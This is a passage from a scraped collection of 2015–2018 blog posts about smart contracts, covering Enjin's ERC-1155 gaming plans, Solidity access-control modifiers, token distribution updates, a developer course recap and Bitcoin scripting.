contract-powered digital gaming assets, both to solve difficult problems and open new ways to create and experience video games.Tokenizing potatoes, sand, and carrots doesn\u2019t really accomplish much, if anything at all.Those assets are real, not virtual and programmable.Know what stuff is made of ones and zeros? Gaming stuff. Stuff like in-game characters, items, and other digital assets.Ethereum is a programmable asset, but it can and should be used for way, way more than a simple exchange of value.So why not for gaming?But\u2026 where do you start?How do you get Ethereum-powered assets into the hands of billions of gamers across the world?Turns out, you\u2019ve gotta add a lil\u2019 something to the Ethereum ecosystem first.Step 2: Contribute to the Ethereum EcosystemTypically, video games have two distinct types of assets: fungible and non-fungible.Gold coins, mana gems, and resources like iron, stone, wood, and wheat are fungible\u200a\u2014\u200athey are mutually interchangeable. One gold coin is equally good as another gold coin; one piece of iron is the same as another piece of iron.One doge = One doge.A unique sword, a spaceship you named \u201cRocinante,\u201d and your in-game lvl 57 cyborg-wizard are non-fungible\u200a\u2014\u200athey are unique. These assets can\u2019t be interchanged; you can\u2019t trade a Mona Lisa for a Mona Lisa.Here is where our team ran into a bit of a problem. Token standards like ERC-20 and ERC-721 require a separate contract to be deployed for each fungible or non-fungible token/collection, making it extremely expensive and inefficient to deploy large databases of items used in mainstream video games.Using ERC-20/ERC-721 for even the simplest multiplayer games is impractical. It would result in placing insane amounts of redundant bytecode on the Ethereum blockchain and would limit functionality due to the nature of separating each token contract into its own permissioned address.Our solution to this problem came in the form of ERC-1155, a groundbreaking new token standard invented by Enjin CTO Witek Radomski.The ERC-1155 Multi Token Standard allows for infinite numbers of fungible and non-fungible items in a single deployed contract.The gaming industry alone will require tens of millions of new items\u200a\u2014\u200abut the application of this standard is by no means limited to the games market. ERC-1155 tokens can be used to certify all forms of ownership, tangible or digital.ERC-1155 is our humble contribution to the Ethereum ecosystem, and we believe its power will be harnessed across a wide range of industries, from automotive and industrial design to finance and artificial intelligence.Our primary mission, however, is to utilize ERC-1155 to disrupt the gaming industry\u200a\u2014\u200aso the next step in our plan has to do with actually getting a critical mass of developers to integrate it with their virtual worlds.Want billions of gamers using crypto?You\u2019ve gotta get millions of game developers on board first.Step 3: Build a Gateway & Partner with\u00a0GiantsTechnology adoption happens in waves\u200a\u2014\u200aand the speed at which those waves travel has drastically increased as the pages of history have unfolded.It took us 2.5 million years to go from building our tools with stone to the point where some of us started using metal roughly 6,000 years ago. Tools made from metal slowly spread across the Old World, but not the New\u200a\u2014\u200aSouth American civilizations were still using stone weapons when the conquistadors invaded in the 16th century.Fast forward to the late 19th and early 20th century, and it took only a couple of decades for us to go from riding horses to driving cars.Nowadays, we have the World Wide Web at our fingertips and in our pockets.Spreading new software-based tech around the globe should be fast in 2018, right?Wrong.Unfortunately, the Internet is both a blessing and a curse. We\u2019re well-connected, but we\u2019re also drowning in a sea of information, constantly bombarded with emails, ads, and messages from all directions.Three great ideas stand out when it comes to breaking through the spam-wall and ensuring that new software is massively adopted:Find an audience that can benefit from using it\u200a\u2014\u200aand make sure they can use it out-of-the-box.Complement an existing, widely used product.Make sure you have a Titan at your side\u2014one that can shake continents, cause earthquakes, and ensure that you\u2019re heard.Our team did just that.We started working on a software development kit for a game development engine used by 4.5 million game developers and partnered up with the company who made it, Unity Technologies.The Blockchain SDK by Enjin is Live on the Unity Asset StoreUnity has listed the Blockchain SDK by Enjin on the Asset Store\u200a\u2014\u200aputting the power of the blockchain at the fingertips\u2026blog.enjincoin.ioThe Blockchain SDK by Enjin is super-simple to use, works straight out of the box, and was built by game industry veterans with centuries of combined experience who are making sure the user interface and experience is seamless for Unity game developers.By the way\u200a\u2014\u200aUnity is the most widely used game engine on the planet.Know what\u2019s pretty cool?Our Blockchain SDK doesn\u2019t even require devs to code in Solidity.To integrate blockchain with their game, all they have to do is punch in some numbers, upload a token image, pick a few variables, spend a couple hours writing Unity-related scripts\u2014and bam, they\u2019ve got ERC-1155 tokens inside their virtual world.Integrating blockchain in a couple of hours sure beats months or even years of development time, right?Step 4: Figure Out Scaling & User ExperienceAll roads lead to Rome\u200a\u2014\u200abut Rome wasn\u2019t built in a day.It took seven centuries for the city of seven hills to become a monolithic empire that turned the Mediterranean Sea into a lake.The empire\u2019s 113 provinces, containing a fifth of the world\u2019s population, were connected with a colossal network of roads\u200a\u2014\u200a400,000 kilometers of stone, gravel, and concrete.Our approach to scaling Ethereum, Efinity, can be likened to building a network of roads intended to connect an empire\u200a\u2014\u200abut we do not expect to build that empire in a day.Our plan is to build it in several distinct, practical stages.We first need Efinity to work for a small kingdom, a dozen or so games that can enjoy the benefits of a scaling solution that makes high throughput transactions possible, with zero gas fees and low block confirmation times.Our ERC-1155 token standard already enables developers to cut gas fees by up to 90% when minting new\u00a0tokens.Development stages that follow will turn the kingdom into a multiverse-spanning empire, with the final version of Efinity capable of supporting a virtually endless number of video games and performing nearly infinite volumes of transactions between millions of players and the game server\u200a\u2014\u200aat high speeds and minuscule costs.Solving the Ethereum scaling problem is a good start, but it\u2019s not enough to bring it to the masses.There\u2019s one crucial piece missing: user experience.Gamers might be tech-savvy, but they won\u2019t jump through hoops just to start playing a game. That\u2019s why we\u2019re building Efinity in a way that allows new users to join the network without any costs, if all the items they send and receive are already on Efinity.This will allow game developers to onboard new players without any existing knowledge of cryptocurrency.When and if they do decide to play around with blockchain-powered gaming assets, gamers will be able to interact with them via the Enjin Wallet.Feel free to play around with this interactive mockup.The wallet was the first product we launched as part of the Enjin ecosystem. It is a constantly evolving app, meticulously updated with new security and utility features and elements.Enjin Wallet Update: Security Audit, New ERC-1155 Features & Supported GamesThe latest Enjin Wallet update brings melting & sending features, two new games\u2014and a detailed security audit.blog.enjincoin.ioWe determined that user experience and utility are of paramount importance for the Enjin Wallet. When gamers decide to interact with blockchain items, the goal is for the entire process to be as streamlined and intuitive as possible.The Enjin Wallet already has a darn decent UX\u00a0, but don\u2019t take my word for it\u2014see for yourself.Gamers (or should I say, everyday consumers) won\u2019t go through dozens of super-complicated steps in order to cash-in and cash-out blockchain assets.That is simply not going to happen. Ever.Fiat-to-crypto conversion (and vice versa), paying the Ethereum gas fees to move items from Efinity to the main chain\u200a\u2014\u200ait all needs to be \u201chidden\u201d in the background, veiled behind an intuitive user interface.You need to merge all the complexities of blockchain into the single tap of a button.The steps need to be dead-simple and as few as possible.And that\u2019s something Enjin is super busy working on.Step 5: Attack on All Fronts & Have an Ace in Your\u00a0PocketWe\u2019re building a myriad of tools on top of Ethereum.We need them so we can transform the gaming industry, but we\u2019re also contributing to the Ethereum ecosystem in the process, with everything from the ERC-1155 token standard to our sleek, ultra-fast universal blockchain explorer EnjinX.Announcing EnjinX: Ad-Free, User-Friendly Ethereum Blockchain ExplorerEnjinX is a modern, fast, responsive web app for exploring Ethereum, ERC-20 tokens & blockchain data. Bitcoin\u2026blog.enjincoin.ioGamers can use EnjinX to check out blockchain gaming assets; game developers can use it to power marketplaces.EnjinX Update: Blockchain Asset Support & The Real Ready Player OneERC-1155 tokens are now public, transparent, and freely browsable on EnjinX\u2014providing a universal library of\u2026blog.enjincoin.ioI\u2019m obviously biased, but the user interface is bloody darn gorgeous.And the user experience is just\u2026 pure joy.Oh, and it\u2019s absolutely ad-free.We\u2019ve also built EnjinX for traders who are sick of annoying advertisements and terrible user interfaces when searching for transactions, and for blockchain developers that want a powerful REST API.We\u2019re attacking on all fronts \u2014building SDKs for Unreal, Godot, and Lumberyard game development engines and spreading the gospel of blockchain at massive game industry events, from GDC and E3 to Unity Unite conferences in Berlin, Seoul, Beijing, and Los Angeles.We\u2019ve been in the gaming industry for 10 years now, with our first product, the Enjin Network, boasting over 20 million users.That is the ace up our sleeve\u200a\u2014\u200aunrestricted access to a massive community of gamers.Most of them use our platform to power their Minecraft servers. More than 121 million users own Minecraft, making it the second best-selling game in the history of mankind\u200a\u2014\u200aright after Tetris.So\u2026 We\u2019re also building a Minecraft plugin.(I\u2019m a hard-core Minecraft player so I\u2019m super-excited about that one.)", "responses": "3"}, {"title": "Crowdfunding Smart Contract And Video\u00a0Demo", "author_name": "ELIX", "link": "https://startupsventurecapital.com/crowdfunding-smart-contract-and-video-demo-9df544ec16dd?source=search_post", "post_date": "Jan 22, 2018", "readtime": "4 min read", "upvotes": "2.4K", "content": "Crowdfunding Smart Contract And Video\u00a0DemoELIXBlockedUnblockFollowFollowingJan 22, 2018This week, we\u2019re excited to release a demo of our crowdfunding smart contract as well as a video demo! Before the demos, we\u2019d like to give some general information about our goals and vision for Boost.BackgroundBoost is our crowdfunding platform hosted on the ELIX mobile app. A creator is someone on Boost who wants to fund an idea for a project. A host is anyone promoting or enabling that creator to reach a broader audience. On our platform ELIX, LLC is the host.Projects will undergo an approval process before appearing on our platform to prevent scammers from taking advantage of our users. We\u2019d also like to give creators with great projects a chance to interact with our community beforehand\u200a\u2014\u200aperhaps in the form of an AMA, demo or livestream. This would allow our users to ask specific questions about the goals or technicalities of each project. Rather than trusting someone else\u2019s judgement, we want each of our users to understand what they\u2019re getting in return.DemoAs we promised last week, we\u2019ve provided a video to demonstrate how easy and simple it is to choose a particular proposal. Additionally, users will be able to see a list of all their selected projects in the \u201cFavorites\u201d section of the Boost platform. When projects are successfully funded, users will also be informed of each project\u2019s success, and what the project\u2019s creator\u2019s next steps will be.Smart Contract DemoOur crowdfunding testnet demo is out! You can try out the smart contract via our testnet scenarios here. There are five scenarios already included:Successful maximum funding campaign (multiple users).Minimum goal reached and funding distributed (multiple users).Insufficient funding (single user).Minimum goal = maximum goal (single user).Insufficient funding (multiple users).You can run as many scenarios in combination as desired. The smart contract will keep track of all relevant funding information. Use the documentation to understand how to interact with the contracts and create your own scenarios. You can view sample results of each scenario here. With our crowdfunding smart contract completed, we\u2019re moving quickly toward Alpha stage.Silicon Valley Ethereum MeetupLast Sunday, Stanford hosted a talk on Ethereum smart contract security. David had the chance to attend this presentation. The talk was given by security researcher Yan Michalevsky and titled \u201cEthereum Bugs Through the Lens of Formal Verification.\u201d The presentation focused on implementing mechanisms to catch smart contract vulnerabilities before contracts are deployed to the blockchain. The proposal in the talk was to incorporate formal verification in the deployment process to ensure that all contracts passed certain security tests. If contracts incorrectly implemented callbacks, for example, miners could reject the bytecode from such contracts. This might seem financially disadvantageous\u200a\u2014\u200abut there is an argument to be made that miners might choose to reject such bytecode to increase the security of the network as a whole and prevent bugs similar to that in the infamous DAO contract. If miners decided not to adopt such tools, these security checks could also be done by each developer before attempting contract deployment. This is an evolving area, but there is general consensus that additional tools for verifying the security of smart contracts would help ensure stability of the Ethereum network.App DesignFor the app, we\u2019ve decided to work with the same designer who designed our website. We\u2019ve been impressed with their clean and concise work, and look forward to sharing their progress throughout the design process. We had them create a simple prototype of the app user interface, and were pleased with the results. Here\u2019s one example of their recent work:The user interface focuses on a clean and minimalist look.Development Team ExpansionWe\u2019ve hired another developer to speed up the app development process. Contracting another developer will allow us to move faster. We\u2019ll also be meeting with AE.studio in the next few days, and will likely be working with them as well. This means there will be around four engineers working on the app over the next month. In combination with the design work underway, this should help bring our product to market much faster.", "responses": "2"}, {"title": "Writing robust smart contracts in\u00a0Solidity", "author_name": "Elena Dimitrova", "link": "https://medium.com/colony/writing-more-robust-smart-contracts-99ad0a11e948?source=search_post", "post_date": "Aug 10, 2016", "readtime": "4 min read", "upvotes": "262", "content": "Writing robust smart contracts in\u00a0SolidityElena DimitrovaBlockedUnblockFollowFollowingAug 10, 2016Before contract function code executes, it\u2019s a good idea to validate who triggered it and what inputs are given.Here we build on the Solidity documentation and our own practice to demonstrate a few methods for validating caller and data of inter-contract communication, in both contract-to-contract and user-to-contract calls.Restricting access is a common pattern for contracts. Note that you can never restrict any human or computer from reading the content of your transactions or your contract\u2019s state. [..] You can restrict read access to your contract\u2019s state by other contracts.Furthermore, you can restrict who can make modifications to your contract\u2019s state or call your contract\u2019s functions. The use of function modifiers makes these restrictions highly readable.Building on the Solidity common patterns above, we make extensive use of function modifiers to ensure the validity of function calls in terms of who the caller is as well as what data is.Validating callerFor call authorisation we can start with a simple scenario where the creator of the contract is the only one we\u2019d like to allow to make certain restricted \u2018owner-only\u2019 calls, e.g. changing the owner, writing to storage, or killing the contract.The Ownable.sol contract below defines the basis of implementing such contract \u2018ownership\u2019 and owner-only function modifier.Any contract which inherits Ownable will have owner set to the caller at the time of its creation, and any of its functions implementing onlyOwner modifier will not accept calls from another account. Note that the creator can be a user or another contract.To put that in context, we use the sample contract code from our previous post on implementing upgradable contracts\u200a\u2014\u200aspecifically the main two contracts: \u2018Parent\u2019 and \u2018Organisation\u2019. To recap those, Parent contract is used to create, store, retrieve and upgrade Organisation instances. Organisation interacts with an instance of EternalStorage via ProposalsLibrary and also with an ITokenLedger implementation instance.We\u2019ll demonstrate how to secure Organisation contract\u2019s storage to allow owner-only write permissions.Securely writing to\u00a0StorageEternalStorage contract is used to read and write values of different types to storage. Every Organisation contract has an instance of EternalStorage to which only it should be able to write. In this case the owner of EternalStorage should be a contract (Organisation) rather than a user. We do not want users to be interacting directly with storage as all the business rules for data are abstracted away from it.For the implementation we simply inherit Ownable and decorate all storage write functions with the onlyOwner modifier, e.g. setUIntValue, setStringValue etc.We need to ensure the owner of EternalStorage instance is the Organisation contract. The easiest way to ensure that, is to let it create it. See constructor below.Here msg.sender in EternalStorage is the Organisation contract which then becomes the only address allowed to write to storage.Note on Libraries: We use a library contract (ProposalsLibrary) to attach a set of functions to EternalStorage, so effectively message calls flow through the following chain: Organisation -> ProposalsLibrary -> EternalStorage.However, since libraries in Solidity pass on the msg.value and msg.sender values, calls to EternalStorage have msg.sender as the Organisation contract address and not ProposalsLibrary address.Securely writing to Storage\u200a\u2014\u200aextended\u00a0exampleLet\u2019s extend the simplified example above to cover our sample scenario of using a Parent contract to create and manage Organisations. We would also like to remove the Organisation contract dependency on EternalStorage just to make our contract lighter. For this we have delegated the role of creating EternalStorage and Organisation to Parent contract, which are both created via the Parent.createOrganisation(bytes32) function. When Parent calls new EternalStorage() it becomes the owner of it as well, so it needs to call Ownable.changeOwner(address) to adjust ownership to the newly created Organisation.This is an example of where EternalStorage ownership change is required due to the more complex initiation process of our contracts.Support for multiple admin\u00a0accountsSince msg.sender only allows for a single owner per contract, to implement support for multiple admins we can make use of storage to manage a collection of user admin account addresses.Below is a helper library which implements the basic functionality of adding and removing admin accounts for a given contract (address).The isUserAdmin function can then be used in a modifier, just like onlyOwner in our previous example. For instance if we wanted to allow multiple admins in Organisation we can implement this as follows.Validating dataIn addition to authorising the call sender, modifiers can be also used to validate the data provided with the call. A sample library of useful modifiers is below, implementing checks for various types, e.g. empty address or zero value integers.Putting it all\u00a0togetherWith the armour of authorisation and validation modifiers you can decorate your functions as necessary to ensure that before you execute a function, you have subjected the caller and call data to the utmost scrutiny.\u00a0Example of such use is in our Organisation.addProposal(bytes32) function which should only allow Organisation admins to create proposals. Additionally we ensure no ether is sent with the request and that we get a non empty key for the proposal being created.", "responses": "1"}, {"title": "Important Update on the UTN Smart Contract, Token Distribution and Future Swapping of\u00a0Tokens", "author_name": "Universa", "link": "https://medium.com/universablockchain/important-update-on-the-utn-smart-contract-token-distribution-and-future-swapping-of-tokens-dd3a1f4bb8df?source=search_post", "post_date": "Jun 15, 2018", "readtime": "6 min read", "upvotes": "1.5K", "content": "Important Update on the UTN Smart Contract, Token Distribution and Future Swapping of\u00a0TokensUniversaBlockedUnblockFollowFollowingJun 15, 2018IMPORTANT NOTICE; THIS POST IS NOT MEANT AS A REPLACEMENT FOR OUR BI-WEEKLY UPDATE THAT IS EXPECTED THIS WEEKEND!Today it is June 15th, which means that we are halfway this month. We are very happy to inform you that the UTN Smart Contract is ready for publishing and we invite everyone interested to take a look at it on the Universa Blockchain here;https://universaexplorer.com/NPo4dIkNdgYfGiNrdExoX003+lFT%2Fd45OA6GifmcRoTzxSRSm5c5jDHBSTaAS+QleuN7ttX1rTvSQbHIIqkcK%2FzWjx%2FfCpP9ziwsgXbyyCtUhLqP9G4YZ+zEY%2FyL%2FGVE(shortlink URL:) https://lnd.im/utnA transcript of the creation of UTN\u200a\u2014\u200aUniversa Token on the Universa\u00a0ExplorerIf you are really curious to see the source code, you can download the binary file of the contract right from the explorer, and generate the source code yourself! In order to do that, you should do the following:\u2022 Get the Uniclient from https://lnd.im/uniclient; see the manual at https://kb.universa.io/uniclient_user_manual/4;\u2022 Having downloaded the contract into a file like \u201cUTN - Universa Token.unicon\u201d from the URL to the Universa Explorer above, call the following command:\u00a0./uniclient --export UTN\\ -\\ Universa\\ Token.unicon --as yaml (Unix/macOS/Linux) or uniclient.bat --export UTN\\ -\\ Universa\\ Token.unicon --as yaml (Windows).Voila, you now have the \u201cUTN - Universa Token.yaml\u201d file, and you can now examine its structure! (Pro hint: look at the https://kb.universa.io/uniclient_user_manual/4#export-a-contract-to-xml-json-or-yaml section and learn how to view it in other formats as this may be more convenient to you).Next to \u201cUnixchange private cloud.\u201d you can click \u201c(download)\u201d to obtain the UTN Smart Contract in its binary\u00a0formFuture UTN IntegrationAs previously communicated on multiple occasions, UTN will not be integrated with exchanges from the start due to the fact that exchanges will have to learn how to work with our protocol. This process starts immediately after the launch and distribution of UTN and will take some time. Universa is more than ready and able to provide them with all the needed information and help to optimize this process! More info on this will be shared later when it will be available.Our Community and\u00a0TokensWe believe that our community can be seen as a collaboration of two groups. On the one hand, there is a group of people who are (active) traders, while on the other hand there is a group of people concerned with the long-term development of Universa and what the project can bring to the world. While our focus is on the second group of engaged community members and we do not encourage speculative behavior, we do respect the first group as well, since they are also part of our community. To remain as close as possible to \u201cthe first half of June\u201d with making tokens available to our community, please read the following paragraphs.We expect this first group of people to choose to swap their UTN for UTNP for trading purposes, while the second group is most likely to either want to swap UTNP for UTN or hold on to their already purchased UTN. To smooth the process for the first group, we have provided the community with, and will do so for the coming days, a Google Form that will reset their withdrawal form at check.universa.io so they will be able to choose UTNP instead of UTN. Hereby eliminating the hassle for them to swap from UTN to UTNP.The first batch of those UTNP tokens to be distributed will start on June 17th. This possibility is offered in the following structure and with the following conditions;Only tokens that were purchased during the Token Sale or earned through participation in the Bounty Program can be withdrawn. People who have tokens solely from registering an account or from referral bonuses are not eligible for this option.The minimum amount to withdraw is 1000 tokens.If a person has not filled in his withdrawal form yet, he can do so at check.universa.io after login and choose the option to withdraw to UTNP.If a person has previously filled in his withdrawal form and chose \u201call to UTN\u201d, through filling in the Google Form, the withdrawal request previously submitted will be removed and reset. He/she can now choose to withdraw to UTNP.If a person chose to withdraw some amount of tokens to UTN and some to UTNP and he/she has not received the UTNP tokens yet, the Google Form can still be filled in to reset the withdrawal form.If a person chose to withdraw some amount of tokens to UTN and some to UTNP and he/she has already received those UTNP, we cannot reset the withdrawal form in order to maintain important data. What we can do, is sent the UTN remainder in UTNP to the exact same ETH address as used for the previous withdrawal to ensure the safety of our community.Please find the mentioned Google Form here; https://goo.gl/forms/D3CDtnMvjKehL4RK2An image of the mentioned Google\u00a0FormNow let us get back to the second group of people. We want to emphasize that we enormously appreciate the level of engagement we are currently receiving from our community. In terms of good, constructive critical questions, encouragement, helping out admins in our chats answering the variety of \u201cwhen\u201d questions that exist but also with trying to set up actual business leads and providing Universa with even more possibilities for business development. We cannot thank you enough! Now that the UTN Smart Contract is out there and everything is being set up for the distribution of the tokens, we also have news for people in this group; UTN, the wallet and URS (for swapping UTNP to UTN) is right around the corner!To give everyone some time to decide to which of the two groups they would like to be part of while we get every last detail perfectly ready for the distribution of UTN we would like to announce the following;Distribution of UTN will start on June 22nd! This process will take place in a number of batches with the largest major batch of UTN to be distributed on June 30th. After the distribution of UTN. We plan to open the bi-directionial swapping method for UTN<>UTNP on a 1:1 basis. A post with instructions for this will follow! This will also address UTN wallets, Universa Reserve System and additional important information.Where we go from\u00a0hereWe believe that approaching the current situation as explained above is the best overall solution. The first group can choose to either opt for UTNP after all or wait a few more days to own UTN while the second group, who we believe to have another perspective, is less occupied with receiving their tokens \u201cas fast as possible\u201d but is more concerned with the development of Universa as a whole. On top of this all we provide the bi-directional swap because we want to ensure that everyone who confided in us with their personal funds has the possibility to access these funds and not have them locked up as we cannot predict how their personal situations would develop and you simple never know. This means that everyone will be able to have liquid funds (through the swap possibility) while we will be assisting exchanges in their quest to learn how to work with our protocol!We are certain that this month we have arrived at some very important milestones for Universa and we cannot wait to see what more is in store for us, together with our community!We are always happy to answer your questions in the Telegram channel\u200a\u2014\u200at.me/uplatform (EN) and t.me/universa (RU).Follow the news in t.me/UniversaNews (EN) and t.me/UniversaNewsRu(RU).Sincerely,Your Paranoid CEO,Alexander Borodich", "responses": "1"}, {"title": "Certified Ethereum Developer: Building Smart Contracts", "author_name": "Shaan Ray", "link": "https://hackernoon.com/certified-ethereum-developer-building-smart-contracts-3d71a49ad45c?source=search_post", "post_date": "Dec 22, 2017", "readtime": "5 min read", "upvotes": "379", "content": "Certified Ethereum Developer: Building Smart ContractsShaan RayBlockedUnblockFollowFollowingDec 22, 2017Ethereum is a public blockchain that supports distributed computing and provides smart contract capabilities on its EVM (Ethereum Virtual Machine). Smart contracts will transform several major industries in the coming years. At first glance, the concept of a smart contract seems simple and basic. However, the range and versatility of operations smart contracts offer is incredible.I recently attended the Certified Ethereum Developer (CED) program at York University\u2019s Blockchain Hub in Toronto. This certification program is the first of its kind. It focuses on Solidity, a programming language that runs on the Ethereum blockchain. By the end of the three-day intensive program, the other attendees and I, were able to code our own smart contracts and create tokens. The course also covered topics including ICOs, DAOs, smart property, and other emerging blockchain concepts. The program ends with an exam and a Capstone Project.I teamed up with Ben Brown and Mo Hasan to build smart contracts focused on smart city and government services. Our Capstone Project was a hypothetical municipality that ran its tax collection and municipal services through a series of smart contracts. Even though we completed and submitted the project, we continue to tweak it and add more features.Though I have been in the blockchain space for years, it was exciting to learn and revisit several new topics during CED. Some of these are below:ModularityEthereum is modular and very flexible. A user can tweak the protocol and change several components of it to suit specific organizational needs. Two important such components are:1. Difficulty level\u200a\u2014\u200ahow difficult do you want to make mining on your network? How much hashing power will it take to solve a block?2. Consensus mechanism\u200a\u2014\u200awhich consensus mechanism do you want your protocol to follow\u200a\u2014\u200aproof of work, proof of stake, or proof of authority?A solidity contract I wrote on the Ethereum\u2019s Remix IDE. This contract performs a simple addition of two numbers. The contract would be triggered externally by someone calling this contract and sending two numbers to be added. On the bottom right of the screen by the addNumber tab I have sent \u20185\u2019 and \u20182\u2019, the result \u20187\u2019 is display next to the getResult tab.Building a blockchainWe worked with GETH and created an internal blockchain for CED attendees. The experience of creating a blockchain from scratch, maintaining it, and participating in transactions on it, was immensely rewarding. It allowed attendees to put their conceptual knowledge into practice. It helped crystallize the following concepts, among others:1. Genesis block\u200a\u2014\u200ain the process of creating our genesis block, we assigned values to several variables, including the volume of currency allowed in this particular blockchain, and how much each user was assigned.2. Timestamp\u200a\u2014\u200aeach block is timestamped with the time at which it was created. Interestingly, Ethereum follows Unix time, which means that it considers the beginning of time to be 00:00:00 UTC Thursday, 1, January 1970 (also known as POSIX time or epoch time).3. Mining\u200a\u2014\u200awe used the commands \u2018> mining.start\u2019 or \u2018> mining.stop\u2019 to start or end mining sessions on our cryptocurrency.4. Transacting\u200a\u2014\u200awe then used the coins we had mined to transact with one another within our network, and also paid fees in the form of \u2018gas\u2019 to enter data into each block.5. Communicating\u200a\u2014\u200aalong with sending cryptocurrencies, we were also able to send messages in \u2018string\u2019 form as part of the transaction data. Messages can be sent to inform another peer of various attributes, such as your Status, your current Ethereum State, and node data.Denominations of\u00a0Ether.Smart ContractsSmart contracts are agreements that are written in code and that are self-executing. They permit transactions to be conducted in a distributed, safe, and transparent environment. (The smart contract concept was first proposed by Nick Szabo in 1994\u200a\u2014\u200athis may be why \u2018szabo\u2019 is a denomination of ether: 1,000,000 szabo = 1 ether.) Some important smart contract concepts include:1. Gas\u200a\u2014\u200athis powers each smart contract. Ether can be converted into gas. The gas exists on the Ethereum Virtual Machine. It cannot be traded on other exchanges. The price of gas is not pegged to ETH. Rather, it varies according to a complex algorithm. Executing a transaction or smart contract uses gas. The amount of gas required is proportional to the complexity of the contract.2. Contracts can call on other contracts\u200a\u2014\u200athey can call functions of other contracts, and can be programmed to create and deploy other contracts using ether and gas.3. Inheritance\u200a\u2014\u200aa contract can be programmed to inherit code from one or more other contracts.4. Calling a contract\u200a\u2014\u200acreating and putting a contract on a block is a necessary but separate step from triggering that contract by calling it. The entity calling a contract is known as \u2018msg.sender\u2019, while the entity at the beginning of a call chain is called \u2018tx.origin\u2019. For example, in call chain A > B > C >D > E, \u2018msg.sender\u2019 could be E while \u2018tx.origin\u2019 is A. (n this scenario, A called on smart contract B; B (according to what the contract demanded) called on C, and so on. The immediately previous actor is denoted by \u2018msg.sender\u2019 while the original entity at the very beginning of this chain is called \u2018tx.origin\u2019.Crypto enthusiasts gearing up for the holiday season. Photo credit Hodlmoon.comOverall ImpressionThe instructors who taught this course were experts in their fields and had a broad range of experience in blockchain technology, distributed ledger applications, payment systems, cryptography and entrepreneurship. I found my colleague Aalim Khan to be a gifted programmer who is highly skilled in Solidity and creating smart contracts.While this post highlights some of my thoughts, it only scratches the surface of what the program covers. For brevity\u2019s sake, I omitted several important conceptual (such as creating our own ERC20 tokens) and social (such as making friends among attendees, instructors, and others in the blockchain community) aspects of the program. While coding skills are a definite plus, a basic understanding of programming is enough to learn a ton from this course.", "responses": "3"}, {"title": "Ontology Launches Smart Contract Tool\u00a0\u201cSmartX\u201d", "author_name": "The Ontology Team", "link": "https://medium.com/ontologynetwork/ontology-launches-smart-contract-tool-smartx-611a6065f3f1?source=search_post", "post_date": "Apr 27, 2018", "readtime": "2 min read", "upvotes": "917", "content": "Ontology Launches Smart Contract Tool\u00a0\u201cSmartX\u201dThe Ontology TeamBlockedUnblockFollowFollowingApr 27, 2018Dear Ontology supporters and technical community members,It has already been one month since we open-sourced the first batch of Ontology projects and we have received enthusiastic response and feedback from developers and the greater community.On April 25 we released Ontology v0.7 and TestNet Polaris. This update includes a new CLI function, WebSocket subscribe function, event push filter, new Wasm APIs, smart contract pre-execute, interoperability across VMs, NeoVM v0.7, SmartX, and more.The market has already recognized the functionality and application prospects of smart contracts, but there are nevertheless limitations. Ordinary users are unable to effectively develop radical products and services due to limitations in programming languages and tools, which results in excessive costs for application developers. SmartX was born to solve these problems.SmartX (http://smartx.ont.io/) is a one-stop IDE that can be used to compile, deploy, and invoke smart contracts. It provides a range of smart contract templates and a powerful online editor. Individuals can use SmartX templates or commission community developers to customize contracts. In the future, smart contract developers will be able to trade smart contracts they have written or collaborate with multiple people to develop smart contracts, using their own expertise to profit.Ontology smart contracts support multiple contract types such as native smart contracts, NeoVM smart contracts, Wasm smart contracts, and more. Currently, SmartX supports NeoVM-based C# and Python, and will support Wasm online compilation functions and additional mainstream programming languages in the future, including Java, Rust, Go, JavaScript, and more.In the future SmartX will work like GitHub to be a distributed software project code hosting platform. This will support multiple people to participate in and share complex contracts, and at the time same, implement a set of economic incentives and integrate fair governance policies to reflect the contributions of each participant. This will foster smart contract writing, smart contract transactions, collaboration, community building, and an altogether valuable smart contract development ecosystem.SmartX has just set foot on its development path. We welcome the developer community to give feedback and even actively participate in its development. We hope the community can provide more development and operation suggestions, and will jointly develop modules, functions, and interfaces to create a rich smart contract development ecosystem.Thank you for your continued support,The Ontology Team", "responses": "1"}, {"title": "", "author_name": "Manuel Araoz", "link": "https://medium.com/@maraoz/smart-contracts-and-bitcoin-a5d61011d9b1?source=search_post", "post_date": "Jul 21, 2015", "readtime": "4 min read", "upvotes": "157", "content": "Smart Contracts and\u00a0BitcoinManuel AraozBlockedUnblockFollowFollowingJul 21, 2015\u201cSmart contract\u201d is a term coined by Nick Szabo around 1993. It refers to computer programs or systems used to secure, execute and enforce interactions between parties. The idea behind this is to transfer trust-critical pieces of a contract to software, to formalize the relation in code. Thus, if one can trust the program executing the contract, one does not need to trust the other party in that they will fulfill the terms.The value and applications of this are still uncertain, but we can begin to see the great potential for transforming how we do business online. Automating complex human processes has been the cornerstone of technological progress in society. Law and contractual relations have yet to feel the vertiginous acceleration of software-driven innovation.Enter bitcoinSince its origin, bitcoin comes with a limited but powerful scripting language to express transfer of ownership of coins. When a transaction sends coins from A to B, there\u2019s actually a script expressing the conditions in which B can take ownership of those coins. In the simple case, B needs to produce a cryptographic signature corresponding to a certain public key. In a general sense, a transaction output sets the rules (via a script) by which it can be spent, and a future transaction needs to produce the data input for that script to execute successfully.Most bitcoin transactions follow a predefined type of script where the coins move from A to B. In the past months, though, we\u2019ve seen a surge in new contracts being built using the scripting language.Let\u2019s see some examples of this, and the corresponding scripts.MultisigThe first ever alternative behavior attached to bitcoins. It\u2019s really simple to understand: instead of having a single entity own the coins, we set a group of entities (identified by their public keys) that will control the funds. Additionally, we can configure how many of those owners are needed to sign off any use of those bitcoins.To understand the technical details, we first need to take a look at how a regular bitcoin transaction script looks (it\u2019s called a Pay-to-PubkeyHash script):This scripts needs two inputs: a signature, and a public key. It checks that hashing the public key results in the bitcoin address holding the funds, and that the digital signature is correct. For more details on how this gets executed see this wiki entry.In contrast, a multisig script looks like this:You just need to replace M, N, and the public keys for the desired values. N is the total amount of owners of the funds. M is how many signatures of those N are required to release the funds. To have this contract execute successfully, we need to provide M digital signatures corresponding to some of the N public keys in the script. That\u2019s it! Shared control of funds expressed in 4 lines of code (more detail here). The applications of such simple script are many and very interesting!Payment ChannelsPayment channels are another simple yet powerful smart contract currently being used. It allows for a continuous flow of off-chain micropayments to be negotiated between two parties in a trustless manner. In this way, one party can provide a service (the provider) in exchange for bitcoins from the other (the consumer), in a truly pay-as-you-go mechanism. There are several similar schemes proposed that implement this high-level behavior, but this one I find most elegant:The consumer is the one that sends funds into this contract, opening the payment channel. The code has two separate branches of execution.One is only valid after a certain time has passed (expressed in the expiry time parameter), and requires only the consumer\u2019s signature. This corresponds to the refund clause of the contract, and is what makes it safe for the consumer. If the provider fails 